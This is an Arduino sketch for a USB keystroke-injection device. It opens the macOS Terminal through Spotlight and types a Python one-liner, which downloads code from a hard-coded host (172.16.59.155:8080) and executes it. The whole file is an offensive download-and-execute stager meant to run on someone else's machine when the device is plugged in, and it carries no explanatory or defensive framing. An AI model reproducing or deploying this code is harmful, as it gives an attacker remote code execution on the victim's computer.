#include <Keyboard.h>
#include "Keyboard.h"

void winRun() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(' ');
    delay(30);
    Keyboard.releaseAll();
    delay(20);
}
void setup() {
    Keyboard.begin();
    delay(2000);
    winRun();
    Keyboard.println("terminal");
    delay(250);
    Keyboard.write(KEY_RETURN);
    delay(500);
    Keyboard.println("python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://172.16.59.155:8080/');exec(r.read());\""); 
    Keyboard.write(KEY_RETURN);
}

void loop() {
  // put your main code here, to run repeatedly:
  /**
   *  terminalterminal
   *  
   *  
   *  
   *  
   *  
   */
}
